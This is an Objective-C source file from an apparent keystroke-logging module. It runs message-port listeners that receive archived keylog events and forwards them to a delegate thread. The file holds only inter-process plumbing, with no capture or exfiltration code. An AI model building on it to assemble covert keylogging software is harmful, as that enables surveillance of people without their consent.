//
//  KeyLogEventNotifier.m
//  KeyLogCaptureManager
//
//  Created by Ophat Phuetkasickonphasutha on 9/5/13.
//  Copyright 2013 __MyCompanyName__. All rights reserved.
//

#import "KeyLogEventNotifier.h"
#import "DefStd.h"
#import "FxKeyLogEvent.h"

@interface KeyLogEventNotifier (private)
- (void) notifierMain;
@end


@implementation KeyLogEventNotifier

@synthesize mDelegate;

- (id) init {
	if ((self = [super init])) {
		mCallerThread = [NSThread currentThread];
	}
	return self;
}

-(void) startNotifiy{
	if (mNotifyThread == nil) {

		mNotifyThread = [[NSThread alloc] initWithTarget:self selector:@selector(notifierMain) object:nil];
		[mNotifyThread start];
	}
}
-(void) stopNotifiy{
	DLog(@"---------- stop notify")
	[mNotifyThread cancel];
	if (mNotifyRunLoop) {
		DLog(@"---------- stop run loop of notifier thread")
		CFRunLoopRef runLoop = [mNotifyRunLoop getCFRunLoop];
		CFRunLoopStop(runLoop);
		mNotifyRunLoop = nil;
	}
	
	[mNotifyThread release];
	mNotifyThread = nil;
}

- (void) notifierMain {
	NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
	@try {
		if (!mMessagePortReader1) {
			DLog (@"port 1")
			mMessagePortReader1 = [[MessagePortIPCReader alloc] initWithPortName:kKeyLogMessagePort
													 withMessagePortIPCDelegate:self];
			[mMessagePortReader1 start];
		}
		if (!mMessagePortReader2) {
			DLog (@"port 2")
			mMessagePortReader2 = [[MessagePortIPCReader alloc] initWithPortName:kKeyLogMessagePort1
													  withMessagePortIPCDelegate:self];
			[mMessagePortReader2 start];		
		}
		if (!mMessagePortReader3) {
			DLog (@"port 3")
			mMessagePortReader3 = [[MessagePortIPCReader alloc] initWithPortName:kKeyLogMessagePort2
													  withMessagePortIPCDelegate:self];
			[mMessagePortReader3 start];		
		}
		
		mNotifyRunLoop = [NSRunLoop currentRunLoop];
		
		CFRunLoopRun();
		
		[mMessagePortReader1 stop];
		[mMessagePortReader1 release];
		mMessagePortReader1 = nil;
		
		[mMessagePortReader2 stop];
		[mMessagePortReader2 release];
		mMessagePortReader2 = nil;
		
		[mMessagePortReader3 stop];
		[mMessagePortReader3 release];
		mMessagePortReader3 = nil;
		
		DLog (@"Exit key log thread")
	}
	@catch (NSException * e) {
		;
	}
	@finally {
		;
	}
	[pool release];
}


-(void) dataDidReceivedFromMessagePort: (NSData*) aRawData{
	NSKeyedUnarchiver *unarchiver = [[NSKeyedUnarchiver alloc] initForReadingWithData:aRawData];
	FxKeyLogEvent * keylog =  [unarchiver decodeObjectForKey:kKeyLogArchied];
	DLog(@"KeyLog - FxKeyLogEvent = %@", keylog);
    [unarchiver finishDecoding];	
	
	if ([mDelegate respondsToSelector:@selector(eventFinished:)]) {
		[mDelegate performSelector:@selector(eventFinished:)
						  onThread:mCallerThread
						withObject:keylog
					 waitUntilDone:NO];
	}
	
	[unarchiver release];
}

- (void) dealloc {
	[self stopNotifiy];
	[super dealloc];
}


@end
